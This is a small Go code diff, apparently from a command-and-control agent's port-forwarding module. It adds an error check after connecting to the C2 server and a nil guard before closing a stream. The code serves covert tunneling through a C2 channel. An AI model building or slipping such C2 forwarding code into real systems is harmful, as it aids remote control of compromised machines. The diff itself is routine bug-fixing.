@@ -100,6 +100,9 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
 		conn, ctx, cancel, err = ConnectCC(url)
+		if err != nil {
+			return fmt.Errorf("failed to connect to CC: %v", err)
+		}
 		log.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
 		go tun.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
 	}
@@ -157,8 +160,10 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			return
 		}
 		defer func() {
-			_, _ = h2.Write([]byte("exit\n"))
-			h2cancel()
+			if h2 != nil {
+				_, _ = h2.Write([]byte("exit\n"))
+				h2cancel()
+			}
 			conn.Close()
 		}()
 
